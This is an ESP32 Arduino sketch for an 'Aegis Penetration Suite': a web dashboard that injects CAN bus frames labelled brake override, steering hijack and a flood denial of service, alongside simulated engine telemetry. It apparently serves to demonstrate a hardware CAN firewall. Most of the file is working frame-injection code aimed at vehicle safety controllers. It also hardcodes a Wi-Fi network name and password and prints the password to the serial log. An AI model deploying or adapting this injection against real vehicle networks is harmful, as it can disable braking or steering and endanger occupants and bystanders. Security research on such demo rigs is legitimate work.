#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <SPI.h>
#include <mcp2515.h>

// ESP32-S3 Specific SPI Pins
#define SCK_PIN 12
#define MISO_PIN 13
#define MOSI_PIN 11
#define CS_PIN 10

MCP2515 mcp2515(CS_PIN);
WebServer server(80);

const char* ssid = "Sudhindra";
const char* password = "sudhindra2024@";

bool telemetryActive = true;
unsigned long lastTelemetryTime = 0;
uint16_t simulatedRPM = 800;
uint8_t simulatedSpeed = 0;

struct can_frame frameRPM;   
struct can_frame frameSpeed; 
struct can_frame frameBrake; 
struct can_frame frameFlood; 
struct can_frame frameHijack;

void handleRoot();
void handleAttack();

// ============================================================================
//   MODERN, PROFESSIONAL UI (Zero External Dependencies)
// ============================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aegis Penetration Suite v2.0</title>
    <style>
        :root { 
            --bg: #f3f4f6; 
            --panel: #ffffff; 
            --border: #e5e7eb; 
            --text: #1f2937; 
            --text-muted: #6b7280;
            --danger: #dc2626; 
            --warn: #ea580c;
            --primary: #2563eb;
            --success: #16a34a;
            --mono: 'Courier New', Courier, monospace; 
            --sans: system-ui, -apple-system, sans-serif;
        }
        body { 
            margin: 0; background: var(--bg); color: var(--text); 
            font-family: var(--sans); 
            overflow-x: hidden;
        }
        .header { 
            padding: 1.5rem 2rem; border-bottom: 1px solid var(--border); 
            display: flex; justify-content: space-between; align-items: center; 
            background: #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .header h1 { 
            margin: 0; font-size: 1.5rem; font-weight: 800; letter-spacing: 1px; 
            color: #111827; text-transform: uppercase;
        }
        .live-badge { 
            display: flex; align-items: center; gap: 8px; font-weight: 600; color: var(--success);
            font-size: 0.9rem;
        }
        .dot { 
            width: 10px; height: 10px; background: var(--success); border-radius: 50%; 
            animation: pulse 2s infinite; 
        }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
        
        .container { 
            max-width: 1500px; margin: 2rem auto; padding: 0 1.5rem; 
            display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;
        }
        @media (max-width: 900px) { .container { grid-template-columns: 1fr; } }
        
        .card { 
            background: var(--panel); border: 1px solid var(--border); 
            border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); overflow: hidden;
        }
        .card-header { 
            padding: 1rem 1.5rem; border-bottom: 1px solid var(--border); 
            background: #f9fafb; font-weight: 700; font-size: 0.95rem;
            color: #4b5563; text-transform: uppercase; letter-spacing: 1px;
        }
        .card-body { padding: 1.5rem; }
        
        .payload-row { 
            display: flex; justify-content: space-between; align-items: center; 
            padding: 1.2rem; border: 1px solid var(--border); border-radius: 6px;
            margin-bottom: 1rem; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s;
        }
        .payload-row:hover { border-color: var(--primary); box-shadow: 0 4px 12px rgba(37,99,235,0.08); }
        
        .payload-info h3 { margin: 0 0 6px 0; font-size: 1.1rem; color: #111827; }
        .payload-info code { 
            color: var(--text-muted); font-family: var(--mono); font-size: 0.85rem; 
            display: block; background: #f3f4f6; padding: 4px 8px; border-radius: 4px; 
            width: fit-content; margin-top: 6px;
        }
        
        .btn { 
            background: #ffffff; color: var(--danger); border: 1px solid var(--danger); 
            padding: 0.6rem 1.2rem; border-radius: 6px; font-weight: 600; cursor: pointer; 
            transition: all 0.2s; text-transform: uppercase; font-size: 0.85rem; letter-spacing: 0.5px;
        }
        .btn:hover { background: var(--danger); color: #ffffff; }
        
        .btn-safe { color: var(--primary); border-color: var(--primary); }
        .btn-safe:hover { background: var(--primary); color: #ffffff; }
        .btn-warn { color: var(--warn); border-color: var(--warn); }
        .btn-warn:hover { background: var(--warn); color: #ffffff; }
        
        /* Target Visualization */
        .target-grid {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; margin-bottom: 1.5rem;
        }
        .ecu-node {
            border: 1px solid var(--border); border-radius: 6px; padding: 1.5rem 1rem; 
            text-align: center; background: #ffffff; transition: all 0.3s;
        }
        .ecu-node.hacked {
            border-color: var(--danger); background: #fef2f2; color: var(--danger);
            animation: shake 0.4s; box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.2);
        }
        .ecu-node.blocked {
            border-color: var(--primary); background: #eff6ff; color: var(--primary);
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2);
        }
        @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-4px);} 75% {transform: translateX(4px);} }
        
        /* Terminal */
        .terminal-container { padding: 1rem; background: #1e1e24; border-radius: 6px; }
        .terminal { 
            height: 300px; overflow-y: auto; font-family: var(--mono); font-size: 0.85rem;
        }
        .log-entry { margin-bottom: 6px; display: flex; animation: slideIn 0.2s ease-out forwards; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        .log-time { color: #6b7280; margin-right: 1rem; }
        .log-msg { color: #d1d5db; }
        .log-info { color: #60a5fa; }
        .log-warn { color: #ef4444; font-weight: bold; }
        .log-success { color: #10b981; }
        .log-shield { color: #3b82f6; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Aegis Penetration Suite</h1>
        <div class="live-badge"><div class="dot"></div> CAN BUS LINK ESTABLISHED</div>
    </div>
    
    <div class="container">
        <!-- Payload Delivery -->
        <div class="card">
            <div class="card-header">Exploit Vectors</div>
            <div class="card-body">
                
                <div class="payload-row">
                    <div class="payload-info">
                        <h3>[0x100] Critical Brake Override</h3>
                        <code>PAYLOAD: FF A5 01 00 00 00 00 00</code>
                    </div>
                    <button class="btn" onclick="inject('brake', 'ecu-brakes')">Inject Malware</button>
                </div>
                
                <div class="payload-row">
                    <div class="payload-info">
                        <h3>[0x001] Steering Actuator Hijack</h3>
                        <code>PAYLOAD: EE EE EE EE EE EE EE EE</code>
                    </div>
                    <button class="btn" onclick="inject('hijack', 'ecu-steer')">Inject Malware</button>
                </div>
                
                <div class="payload-row">
                    <div class="payload-info">
                        <h3>[0x010] Denial of Service (Flood)</h3>
                        <code>VECTOR: High-Priority Dominant Bits</code>
                    </div>
                    <button class="btn btn-warn" onclick="inject('flood', 'ecu-net')">Execute DoS</button>
                </div>

                <div class="payload-row" style="margin-top: 2rem; background: #f9fafb;">
                    <div class="payload-info">
                        <h3>[0x123] Background Telemetry</h3>
                        <code>STATUS: Simulating Engine/Speed Traffic</code>
                    </div>
                    <button class="btn btn-safe" id="btnToggle" onclick="inject('toggle', null)">Pause Traffic</button>
                </div>
            </div>
        </div>
        
        <!-- Live Forensics -->
        <div class="card">
            <div class="card-header">Target System Status</div>
            <div class="card-body">
                <div class="target-grid">
                    <div id="ecu-brakes" class="ecu-node">
                        <div style="font-size: 1.8rem; margin-bottom: 8px;">🛑</div>
                        <strong>ABS ECU</strong><br><small style="color: var(--text-muted);">ONLINE</small>
                    </div>
                    <div id="ecu-steer" class="ecu-node">
                        <div style="font-size: 1.8rem; margin-bottom: 8px;">☸️</div>
                        <strong>STEER ECU</strong><br><small style="color: var(--text-muted);">ONLINE</small>
                    </div>
                    <div id="ecu-net" class="ecu-node">
                        <div style="font-size: 1.8rem; margin-bottom: 8px;">🌐</div>
                        <strong>CAN GATEWAY</strong><br><small style="color: var(--text-muted);">ONLINE</small>
                    </div>
                </div>
                
                <div class="terminal-container">
                    <div class="terminal" id="terminal">
                        <div class="log-entry">
                            <span class="log-time">00:00:00.000</span>
                            <span class="log-msg log-success">SYSTEM INITIALIZED. CONNECTED TO BUS AT 500KBPS.</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let isTelemetryActive = true;

        function addLog(msg, type='normal') {
            const term = document.getElementById('terminal');
            const d = new Date();
            const timeStr = d.getHours().toString().padStart(2, '0') + ':' + 
                            d.getMinutes().toString().padStart(2, '0') + ':' + 
                            d.getSeconds().toString().padStart(2, '0') + '.' + 
                            d.getMilliseconds().toString().padStart(3, '0');
            
            let classStr = 'log-msg';
            if(type === 'info') classStr += ' log-info';
            if(type === 'warn') classStr += ' log-warn';
            if(type === 'success') classStr += ' log-success';
            if(type === 'shield') classStr += ' log-shield';

            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">${timeStr}</span><span class="${classStr}">${msg}</span>`;
            
            term.appendChild(entry);
            term.scrollTop = term.scrollHeight;
        }

        function setEcuStatus(ecuId, state) {
            if(!ecuId) return;
            const node = document.getElementById(ecuId);
            node.className = 'ecu-node'; // reset
            if(state === 'hacked') {
                node.classList.add('hacked');
                node.innerHTML = node.innerHTML.replace('ONLINE', 'COMPROMISED').replace('SECURE', 'COMPROMISED');
            } else if(state === 'blocked') {
                node.classList.add('blocked');
                node.innerHTML = node.innerHTML.replace('COMPROMISED', 'SECURE').replace('ONLINE', 'SECURE');
                setTimeout(() => {
                    node.className = 'ecu-node';
                    node.innerHTML = node.innerHTML.replace('SECURE', 'ONLINE');
                }, 3000);
            }
        }

        async function inject(type, targetEcu) {
            if(type !== 'toggle') {
                addLog(`[TX] INJECTING MALICIOUS PAYLOAD: ${type.toUpperCase()}`, 'info');
                if(targetEcu) setEcuStatus(targetEcu, 'hacked');
            }
            
            try {
                const res = await fetch(`/api/attack?type=${type}`);
                const text = await res.text();
                
                if (text.includes("HARDWARE INTERCEPT")) {
                    addLog(`[!] ERR_ACK: PAYLOAD DESTROYED. HARDWARE FIREWALL ENFORCED MITIGATION!`, 'shield');
                    if(targetEcu) setEcuStatus(targetEcu, 'blocked');
                } else if (text.includes("TOGGLED")) {
                    isTelemetryActive = !isTelemetryActive;
                    document.getElementById('btnToggle').innerText = isTelemetryActive ? "Pause Traffic" : "Resume Traffic";
                    addLog(`[SYS] TELEMETRY STREAM ${isTelemetryActive ? 'RESUMED' : 'PAUSED'}.`);
                } else {
                    addLog(`[OK] SYS_ACK: PAYLOAD SUCCESSFULLY TRANSMITTED ON BUS.`, 'warn');
                }
            } catch (e) {
                addLog(`[X] ERR_CONN: UNABLE TO COMMUNICATE WITH INJECTOR NODE.`, 'warn');
            }
        }
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
//   SERVER ROUTING & ATTACK LOGIC
// ============================================================================

void handleRoot() {
    server.send(200, "text/html", index_html);
}

void handleAttack() {
    String type = server.arg("type");
    String response = "";

    if (type == "toggle") {
        telemetryActive = !telemetryActive;
        response = "TOGGLED";
    } 
    else if (type == "brake") {
        unsigned long tStart = micros();
        MCP2515::ERROR res = mcp2515.sendMessage(&frameBrake);
        unsigned long tElapsed = micros() - tStart;

        if (res == MCP2515::ERROR_OK) {
            response = "SUCCESS";
        } else {
            response = "HARDWARE INTERCEPT DETECTED! Destroyed in " + String(tElapsed) + "us";
        }
    }
    else if (type == "flood") {
        for (int i = 0; i < 20; i++) {
            mcp2515.sendMessage(&frameFlood);
            delay(2);
        }
        response = "FLOOD_COMPLETE"; 
    }
    else if (type == "hijack") {
        mcp2515.sendMessage(&frameHijack);
        response = "SUCCESS";
    }

    server.send(200, "text/plain", response);
}

// ============================================================================
//   MAIN SETUP & LOOP
// ============================================================================

void setup() {
  Serial.begin(115200);
  delay(3000); // Give Serial monitor time to open
  
  Serial.println("\n\n===============================================");
  Serial.println("[*] BOOTING AEGIS PENETRATION SUITE...");
  Serial.println("===============================================");

  SPI.begin(SCK_PIN, MISO_PIN, MOSI_PIN, CS_PIN);
  
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
  
  Serial.print("[*] Connecting to Hotspot (");
  Serial.print(ssid);
  Serial.print(")...");

  int wifi_attempts = 0;
  while (WiFi.status() != WL_CONNECTED && wifi_attempts < 15) {
    delay(1000);
    Serial.print(".");
    wifi_attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n[+] WiFi Connected Successfully!");
    
    // Start mDNS so they don't need the IP!
    if (MDNS.begin("aegis")) {
      Serial.println("[+] mDNS responder started");
      Serial.println("[+] >>> YOU CAN NOW GO TO: http://aegis.local");
    }
    
    Serial.print("[+] >>> DASHBOARD URL: http://");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\n[!] CRITICAL ERROR: Could not connect to Hotspot.");
    Serial.println("[!] FIX: Make sure your phone hotspot is turned ON.");
    Serial.println("[!] FIX: Make sure the hotspot is set to '2.4GHz' band (ESP32 cannot see 5GHz).");
    Serial.println("[!] FIX: Double check password is 'sudhindra2024@'.");
  }
  
  mcp2515.reset();
  mcp2515.setBitrate(CAN_500KBPS, MCP_8MHZ);
  mcp2515.setNormalMode();

  frameRPM.can_id = 0x123; frameRPM.can_dlc = 8;
  frameSpeed.can_id = 0x200; frameSpeed.can_dlc = 8;
  
  frameBrake.can_id = 0x100; frameBrake.can_dlc = 8;
  frameBrake.data[0] = 0xFF; frameBrake.data[1] = 0xA5; frameBrake.data[2] = 0x01;
  
  frameFlood.can_id = 0x010; frameFlood.can_dlc = 8;
  memset(frameFlood.data, 0x00, 8); 

  frameHijack.can_id = 0x001; frameHijack.can_dlc = 8;
  memset(frameHijack.data, 0xEE, 8);

  server.on("/", handleRoot);
  server.on("/api/attack", handleAttack);
  server.begin();
}

void loop() {
  server.handleClient(); 

  if (telemetryActive && (millis() - lastTelemetryTime > 1000)) {
    lastTelemetryTime = millis();
    simulatedRPM = (simulatedRPM > 5000) ? 800 : simulatedRPM + 150;
    simulatedSpeed = (simulatedSpeed > 120) ? 0 : simulatedSpeed + 2;

    frameRPM.data[0] = (simulatedRPM >> 8) & 0xFF; frameRPM.data[1] = simulatedRPM & 0xFF;
    frameSpeed.data[0] = simulatedSpeed;

    mcp2515.sendMessage(&frameRPM);
    delay(5);
    mcp2515.sendMessage(&frameSpeed);
  }
}
